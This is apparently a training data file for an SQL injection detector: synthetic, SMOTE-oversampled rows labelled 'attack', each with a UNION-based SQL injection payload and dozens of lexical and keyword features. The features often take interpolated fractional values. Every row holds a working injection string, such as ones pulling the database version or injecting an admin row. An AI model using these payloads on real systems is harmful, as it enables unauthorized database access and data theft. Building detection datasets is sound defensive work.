id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000066,attack,union,"-1187'  )   union all select 8202,8202,8202,8202,8202,8202,8202#",nearest_attack_euclidean,R000173,0.09145232747417854,63.52403281701366,21.0,3.7065556048527473,13.999999999999998,31.61922625361093,8.0,9.904806563402731,0.22051470883522475,0.49757982788312033,0.12600840504869987,0.15589705823295505,1.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,5.904806563402732,1.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000067,attack,union,"1""  )   as hymr where 5497  =  5497 union all select null,null,null,null--",nearest_attack_euclidean,R000260,0.6183192268363101,74.77260552307911,25.02444742840287,3.955496781993307,41.74815809467623,9.0,15.349631618935247,8.674815809467624,0.5568349138743504,0.12122104915463905,0.205650021006256,0.11629401596475457,0.0,1.0,2.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,3.6748158094676233,3.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000068,attack,union,"1""   )    )     )   union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000130,0.6406838335843208,68.24509737022726,16.245097370227253,3.1959214258530895,38.0,1.0,18.0,11.245097370227253,0.5568385123468381,0.014653645061758869,0.26376561111166014,0.16474223147974285,0.0,1.0,2.0,0.0,0.0,0.0,0.0,3.0,0.24509737022725242,0.0,5.0,2.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000069,attack,union,"-4373'+  (  select 'rlht' where 2285  =  2285 union all select 2285,2285,2285#",nearest_attack_euclidean,R000065,4.046924964496989,78.0,28.460436708370946,4.2710118353465525,30.752524050045132,24.29208734167419,14.123737974977434,8.831650633303244,0.3942631288467325,0.3114370172009512,0.18107356378176198,0.11322629017055441,3.2920873416741885,0.0,0.7079126583258112,0.0,0.0,1.0,0.0,0.7079126583258112,0.0,0.0,1.707912658325811,2.415825316651622,1.0,0.0,0.0,0.7079126583258112,0.0,1.0,0.7079126583258112,0.0,0.0,0.0,0.0,1.7079126583258113,1.0,0.7079126583258111,0.0,0.29208734167418876,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.707912658325811
SMOTE_000070,attack,union,"1%""   )    )     )   union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000183,1.1690614440467844,68.55276866599408,16.552768665994087,3.2153639384041406,38.0,1.0,18.0,11.552768665994085,0.5543467158338076,0.014588071469310737,0.26258528644759305,0.16847992624928876,0.0,1.0,2.0,0.0,0.0,0.0,0.0,3.0,0.5527686659940859,0.0,5.0,2.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000071,attack,union," select * from users where id  =  1 union select @ 1a,version  (    )   -- 1",nearest_attack_euclidean,R000016,0.44699037486714144,76.0,26.0,3.8622789656603556,40.6600096669887,3.0,23.660009666988696,8.679980666022608,0.5350001271972197,0.03947368421052633,0.31131591667090386,0.11421027192135011,0.0,0.0,2.0,0.0,1.0,1.0,0.0,2.0,0.0,0.0,1.0,4.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000072,attack,union,1'||  (  select 'ptkj' from dual where 6263  =  6263 union all select null--,nearest_attack_euclidean,R000172,2.3415002519910724,76.64143959781488,28.572373601456743,4.246096244540796,38.434241608740464,12.207197989074423,16.572373601456743,9.427626398543257,0.5026154794726624,0.15805697714678918,0.21645501674681203,0.12287252663373642,3.0,0.0,2.2138131992716286,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.42762639854325624,5.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.7861868007283718,2.0,1.0,1.0,0.7861868007283718,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.786186800728371
SMOTE_000073,attack,union," select * from users where id  =  1 +$+. union select null,@@VERSION -- 1",nearest_attack_euclidean,R000036,0.7643986051275075,72.39493250991057,31.697466254955287,4.405855318227876,44.0,2.0,15.697466254955286,10.697466254955286,0.6078763205795745,0.02763074184452613,0.2167848960936073,0.14770804148229202,0.0,0.0,2.0,0.0,1.302533745044714,1.0,0.0,0.0,0.0,0.0,1.0,5.697466254955286,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000074,attack,union," select * from users where id  =  1 + \+*$ union select null,@@VERSION -- 1",nearest_attack_euclidean,R000026,0.5073362263532722,74.43293826886229,31.716469134431144,4.379259184670715,44.0,2.0,17.0,11.432938268862284,0.5912238750995542,0.026873812504525196,0.2284274062884641,0.15347490610745643,0.0,0.0,2.0,0.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,6.4329382688622845,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000075,attack,union,"-3955%'   )    )    union all select 7999,7999,7999,7999,7999,7999,7999,7999,7999#",nearest_attack_euclidean,R000063,0.6605192812758973,82.0,21.745560275516706,3.394786674285572,13.999999999999998,38.50887944896659,15.491120551033411,14.0,0.17073170731707318,0.46962048108495835,0.18891610428089528,0.17073170731707318,1.0,0.0,1.0,0.0,0.0,0.0,0.0,2.372780137758353,1.0,0.0,7.627219862241647,1.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000076,attack,union," select * from users where id  =  '1' or $ .  =  1 union select 1,@@VERSION -- 1'",nearest_attack_euclidean,R000008,1.0717313616984976,78.3155295772403,32.0,4.315732465759942,42.0,3.552588262873382,19.762941314366913,13.0,0.5370778202067338,0.04518477876276261,0.25149902810937175,0.1662383729211319,3.0,0.0,2.0,0.0,1.0,1.5525882628733827,0.0,0.0,0.0,0.0,1.0,5.0,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
SMOTE_000077,attack,union," select * from users where id  =  1.  union select 1,version  (    )   -- 1",nearest_attack_euclidean,R000030,0.08032558845170039,75.26323421594573,25.263234215945726,3.8067074648024706,40.26323421594573,3.0,24.0,8.0,0.5349496837821228,0.03986145567581803,0.3188916454065443,0.10629721513551477,0.0,0.0,2.0,0.0,1.0,1.0,0.0,2.0,0.0,0.0,1.0,4.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000078,attack,union,"1  )   where 1443  =  1443 union all select null,null,null,null,null#",nearest_attack_euclidean,R000071,0.08991746678512437,69.42271544684365,21.16908617873746,3.6878124309411002,39.33817235747492,9.0,14.0,7.084543089368729,0.56655855664686,0.12968969075174444,0.20173951894715805,0.10201223365423753,0.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,4.084543089368729,1.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000079,attack,union,"1'  )   union all select null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000167,0.36468749531514894,72.95497032623685,16.0,3.096394346287115,51.56397626098948,1.0,8.0,12.39099406524737,0.7066889915156431,0.013722207130052455,0.10977765704041981,0.16981114431388455,1.0,0.0,2.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,8.39099406524737,2.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000080,attack,union,"1' where 3760  =  3760 union all select null,null,null,null,null,null,null,null#",nearest_attack_euclidean,R000223,1.072454621710488,74.40236780952354,22.6268245206349,3.724785370667873,46.52189424761883,9.0,10.0,8.880473561904708,0.6235059195238088,0.12218820956044002,0.1357646772893778,0.11854119362637332,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,5.880473561904708,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000081,attack,union,"-9078 union all select 3779,3779,3779,3779,3779,3779,3779,3779--",nearest_attack_euclidean,R000231,0.20844492308148266,65.0482279734579,18.20964559469158,3.473615578730037,13.999999999999998,36.83858237876632,4.0,10.20964559469158,0.21565135311900113,0.5658642451850844,0.061614672319714625,0.15686972937619978,0.0,0.0,3.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.2096455946915805,3.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000082,attack,union,"-8308""  )   union all select 3084,3084,3084,3084,3084,3084,3084,3084,3084#",nearest_attack_euclidean,R000269,0.05776950216989109,73.69845237728778,20.060309524542443,3.6470519581396923,13.999999999999998,39.758761901830226,8.0,11.939690475457555,0.19008058841173378,0.5393180501781938,0.1086174790924193,0.16198388231765326,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,7.939690475457556,1.0,0.0,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000083,attack,union,"-4400 union all select 3983,3983,3983,3983,3983,3983,3983,3983,3983,3983--",nearest_attack_euclidean,R000196,0.24778592344754913,74.0,18.370318105998503,3.4991896346760827,13.999999999999998,44.0,4.0,12.0,0.1891891891891892,0.5945945945945946,0.05405405405405406,0.16216216216216217,0.0,0.0,3.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,9.0,3.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000084,attack,union,"-4764  )   where 8200  =  8200 union all select 8200,8200,8200,8200--",nearest_attack_euclidean,R000247,0.20318356116130284,69.9855368839486,24.19710737678972,3.9048186970675047,19.0,28.788429507158874,14.0,8.197107376789718,0.27169502530453915,0.41104712166929136,0.20019633443492357,0.11706151859124596,0.0,0.0,3.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,3.197107376789719,4.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000085,attack,union,"-5771'   )    )    union all select 2833,2833,2833,2833,2833,2833--",nearest_attack_euclidean,R000080,0.39198026437621036,67.76118121158875,21.576118121158874,3.8570081622815287,13.999999999999998,28.608944969271,14.0,11.152236242317748,0.2077382309672396,0.4201358062313333,0.2077382309672396,0.16438773183418748,1.0,0.0,3.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,5.152236242317749,3.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000086,attack,union,"-5903%'  )   union all select 8293,8293,8293,8293,8293,8293,8293,8293#",nearest_attack_euclidean,R000252,0.642614032163945,69.19212553191872,22.730708510639577,3.792349836473559,13.999999999999998,33.8456680851166,9.615748936162548,11.730708510639575,0.20241156557636203,0.4883326752258183,0.13977940752154128,0.16947635167627836,1.0,0.0,1.0,0.0,0.0,0.0,0.0,1.2692914893604246,1.0,0.0,6.461417021279151,1.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000087,attack,union," select * from users where id  =  1 union select 1`\`,version  (    )   -- 1",nearest_attack_euclidean,R000042,3.332006268787679,75.6756100716274,26.0,3.8752516680422153,40.0,2.6756100716274016,23.324389928372597,9.675610071627402,0.5285922100236673,0.03531921670680707,0.3082657198085767,0.12782285346094885,0.0,0.0,2.0,0.0,1.0,1.0,0.0,2.0,0.0,0.32438992837259917,1.0,4.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000088,attack,union,"1  )   as ghew where 6441  =  6441 union all select null,null--",nearest_attack_euclidean,R000059,1.0387797838376194,61.38440716704313,23.211694624717655,3.9187371476011834,31.38440716704313,9.0,16.0,5.0,0.5107700336323093,0.14676898991030718,0.260922648729435,0.08153832772794845,0.4038982082392179,0.0,2.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.5961017917607823,3.0,0.40389820823921796,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000089,attack,union,-4965  )   as imga where 3705  =  3705 union all select 3705--,nearest_attack_euclidean,R000244,0.5454230956234403,63.62913726357888,25.59271568410528,4.049622750571383,26.629137263578887,14.574504894368475,17.221852947684162,5.20364215794736,0.4171147646894974,0.23169426433953533,0.2695135222440452,0.0816774487269221,0.0,0.0,2.7963578420526396,0.0,0.0,1.0,0.0,1.2036421579473606,0.0,0.0,0.2036421579473604,3.796357842052639,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000090,attack,union," select * from users where id  =  1.<1# union select 1,version  (    )   -- 1",nearest_attack_euclidean,R000025,0.2530707926272279,77.0,26.632849987745903,3.913000728816189,40.0,4.367150012254095,23.0,9.632849987745903,0.5194805194805194,0.05671623392537786,0.2987012987012987,0.12510194789280393,0.0,0.0,2.0,0.0,1.0,1.0,0.0,2.0,0.0,0.0,1.0,5.0,0.0,0.0,1.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000091,attack,union,"-9937'   )    )    union all select 3900,3900,3900,3900,3900,3900,3900,3900,3900#",nearest_attack_euclidean,R000246,0.7870430894048461,78.998814775439,20.4002370449122,3.4983002006356605,13.999999999999998,36.79810364070241,15.600948179648798,12.599762955087801,0.17739060967249093,0.4647000980960582,0.19845571729944875,0.15945357493200207,1.0,0.0,1.0,0.0,0.0,0.0,0.0,2.4002370449122,0.0,0.0,7.1995259101756,1.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000092,attack,union," select * from users where id  =  '1' or \<$ union select 1,@@VERSION -- 1'",nearest_attack_euclidean,R000047,0.4594536338665495,76.28167615672776,33.0,4.399615816828282,42.0,3.1830965938182505,17.915482969091254,13.18309659381825,0.5512470896613715,0.041607677409135874,0.23428824845812557,0.17285698447136716,3.0,0.0,2.0,0.0,1.0,1.1830965938182512,0.0,0.0,0.0,0.0,1.0,5.1830965938182505,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
SMOTE_000093,attack,union,"1%""   )    )    union all select null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000139,0.444099485744035,76.36895472273667,17.0,3.1994520838706872,47.89516377818934,1.0,14.0,13.473790944547336,0.6269706127848313,0.013108286910240075,0.18351601674336068,0.17640508356156792,0.0,1.0,2.0,0.0,0.0,0.0,0.0,2.0,1.0,0.0,7.473790944547336,2.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000094,attack,union,"-8073   )    )     )   union all select 4481,4481,4481,4481--",nearest_attack_euclidean,R000238,0.6782238059263725,62.47766081296517,20.0,3.611775262014921,13.999999999999998,20.985107208643445,18.0,9.492553604321722,0.22444647629520129,0.33534091594517906,0.28857404095097305,0.15163856680864657,0.24627680216086162,0.0,3.0,0.0,0.0,0.0,0.0,3.0,0.0,0.0,3.2462768021608612,3.0,0.24627680216086154,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000095,attack,union,"-3997'+  (  select 'avjk' where 1917  =  1917 union all select 1917,1917,1917--",nearest_attack_euclidean,R000232,1.356059061223151,78.62851595761967,27.247656028253555,4.145355402068184,30.485936169521324,22.142579788098345,15.247656028253553,10.752343971746447,0.3884347092973375,0.2808426749295299,0.1940601410505889,0.13666247472254378,3.0,0.0,2.8761719858732233,0.0,0.0,1.0,0.0,1.0,0.0,0.0,1.7523439717464457,5.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.12382801412677688,2.0,1.0,1.0,0.1238280141267769,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.123828014126778
SMOTE_000096,attack,union,"1%'   )    )     )   union all select null,null,null,null,null,null#",nearest_attack_euclidean,R000123,0.11622380242773209,68.0,17.0,3.2107937645055333,38.30397067901117,1.0,17.696029320988828,11.0,0.5632936864560467,0.01470588235294118,0.26023572530865924,0.16176470588235295,1.0,0.0,0.0,0.0,0.0,0.0,0.0,2.9240073302472074,1.0,0.0,5.075992669752792,0.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000097,attack,union,"-5066'   )    )    union all select 9689,9689,9689,9689#",nearest_attack_euclidean,R000272,0.6055689832289913,56.758821577223465,21.0,3.756787831017546,13.999999999999998,22.023524205929238,12.48235684555307,8.252940525741154,0.2467846543337989,0.3868465266306199,0.2210618890041899,0.14530693003139133,1.0,0.0,1.0,0.0,0.0,0.0,0.0,1.7470594742588452,0.0,0.0,3.5058810514823096,1.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000098,attack,union,"1234 "" AND 1  =  0 UNION ALL SELECT ""admin"", ""81dc9bdb52d04dc20036dbd8313ed055",nearest_attack_euclidean,R000005,6.424088269754525,75.35117055465555,31.558528425775926,4.4410054012036095,30.58528425775925,24.558528425775926,13.765886296896301,6.4414715742240745,0.4039104705648642,0.32617271249005225,0.18403224439138977,0.08588457255369383,0.0,2.675585277327775,0.4414715742240751,0.0,0.0,1.0,0.0,0.44147157422407524,0.0,0.0,1.441471574224075,1.4414715742240751,0.0,1.0,0.0,0.4414715742240751,0.0,1.0,0.4414715742240752,0.0,0.0,0.0,0.0,1.0,1.0,0.4414715742240751,0.0,0.5585284257759249,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
